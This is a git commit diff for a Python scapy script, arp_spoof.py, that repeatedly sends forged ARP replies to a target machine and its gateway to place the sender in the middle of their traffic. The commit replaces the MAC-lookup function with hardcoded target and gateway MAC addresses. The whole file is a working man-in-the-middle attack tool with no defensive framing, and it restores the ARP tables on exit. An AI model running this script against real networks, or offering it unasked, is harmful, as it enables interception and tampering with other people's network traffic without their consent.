ea4e736da5790c2fa1eaee9c2a77b66eff568489
wheels4 <wheels4@uw.edu>
2020-09-05 15:29:09 -0700

    added_spoofing

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,40 +1,34 @@
-import scapy.all as scapy 
+import scapy.all as scapy
 import time
+from getmac import get_mac_address
 
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst = ip)
-    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
-    return answered_list[0][1].hwsrc
-
-def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
+def spoof(target_ip, target_mac, spoof_ip):
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac,
                                                             psrc = spoof_ip)
     scapy.send(packet, verbose = False)
 
 
-def restore(destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
+def restore(destination_ip, destination_mac, source_ip, source_mac):
     packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
     scapy.send(packet, verbose = False)
 
 
 target_ip = "192.168.1.5" # Enter your target IP
+target_mac = "A0:C9:A0:84:81:78"
 gateway_ip = "192.168.1.1" # Enter your gateway's IP
+gateway_mac = "A0:63:91:46:EB:0C"
 
 try:
     sent_packets_count = 0
     while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
+        spoof(target_ip, target_mac, gateway_ip)
+        spoof(gateway_ip, gateway_mac, target_ip)
         sent_packets_count = sent_packets_count + 2
         print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
         time.sleep(2) # Waits for two seconds
 
 except KeyboardInterrupt:
     print("\nCtrl + C pressed.............Exiting")
-    restore(gateway_ip, target_ip)
-    restore(target_ip, gateway_ip)
+    restore(gateway_ip, gateway_mac, target_ip, target_mac)
+    restore(target_ip, target_mac, gateway_ip, gateway_mac)
     print("[+] Arp Spoof Stopped")
